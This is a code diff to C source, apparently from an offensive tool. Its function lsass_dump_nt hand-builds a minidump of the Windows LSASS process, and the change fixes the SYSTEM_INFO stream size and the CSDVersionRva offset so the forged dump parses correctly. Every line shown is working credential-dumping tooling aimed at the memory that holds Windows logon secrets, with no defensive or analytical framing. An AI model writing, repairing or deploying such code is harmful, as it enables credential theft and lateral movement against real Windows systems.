@@ -870,10 +870,10 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len, int *out_partial)
 
     /* build MDMP */
     #define MOD_ENT_SZ 108
-    #define SYS_INFO_SZ 56
+    #define SYS_INFO_SZ 62  /* 56 struct + 6 bytes empty MINIDUMP_STRING for CSDVersionRva */
     int dir_off     = 32;
     int sys_info_off= dir_off + 3*12;           /* 68 */
-    int mod_list_off= sys_info_off + SYS_INFO_SZ; /* 124 */
+    int mod_list_off= sys_info_off + SYS_INFO_SZ; /* 130 */
 
     /* build module name blobs (MINIDUMP_STRING = ULONG32 len + UTF-16 + null) */
     typedef struct { int rva; uint8_t *blob; int blob_len; } NameBlob;
@@ -927,6 +927,9 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len, int *out_partial)
     WU32(sys_info_off+12, 0);     /* MinorVersion */
     WU32(sys_info_off+16, 19041); /* BuildNumber */
     WU32(sys_info_off+20, 2);     /* PlatformId */
+    /* CSDVersionRva → 6-byte empty MINIDUMP_STRING appended after the 56-byte struct
+     * (Length=0, null wchar = 00 00 00 00 00 00, already zeroed by calloc) */
+    WU32(sys_info_off+24, sys_info_off+56);
 
     /* ModuleList */
     WU32(mod_list_off, n_mods);
